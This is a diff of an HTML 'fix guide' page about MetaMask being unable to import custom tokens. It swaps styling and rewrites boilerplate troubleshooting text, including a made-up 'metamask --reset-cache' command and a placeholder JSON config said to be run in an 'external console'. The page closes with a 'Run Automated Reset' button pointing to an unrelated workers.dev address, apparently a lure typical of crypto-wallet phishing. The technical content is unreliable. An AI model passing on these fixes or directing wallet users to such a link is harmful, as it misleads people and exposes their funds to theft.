@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Importing A Custom Token Does Not Work – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #121214;
+        font-family: -apple-system;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,29 +42,34 @@
 <h1>Metamask Extension Bug Importing A Custom Token Does Not Work</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users are unable to import custom tokens into their Metamask wallet, resulting in an inability to interact with or manage these tokens within the wallet.</li>
+<li>Users are unable to import custom tokens into their Metamask wallet, resulting in an inability to interact with or manage these tokens within the extension.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a compatibility issue between the Metamask extension and the Ethereum blockchain, specifically with the token's smart contract or the wallet's configuration.</li>
+<li>The issue arises from a potential mismatch between the token's smart contract address and the network ID, or a failure to properly configure the token's metadata.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Check the token's contract address and ensure it is correctly formatted.</li>
-<li>Verify that the token's decimal places are correctly set.</li>
-<li>Update Metamask to the latest version and try importing the token again, using the following command to clear cache:</li>
+<li>Check the token's contract address for accuracy and ensure it matches the expected format.</li>
+<li>Verify the network ID to confirm that it aligns with the token's native blockchain.</li>
+<li>Utilize the following JSON configuration to manually add the token:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>metamask<span class="w"> </span>--reset-cache
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...token_contract_address&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...token_symbol&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="err">...</span><span class="kc">t</span><span class="err">oke</span><span class="kc">n</span><span class="err">_decimals</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;image&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...token_image_url&quot;</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting. </p>
+<p>Consider using an external console to execute these commands for more flexibility.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Custom token contract address and decimal places known</li>
-<li>Basic understanding of Ethereum blockchain and token management</li>
+<li>Access to the token's contract address and metadata</li>
+<li>Familiarity with JSON configuration files</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
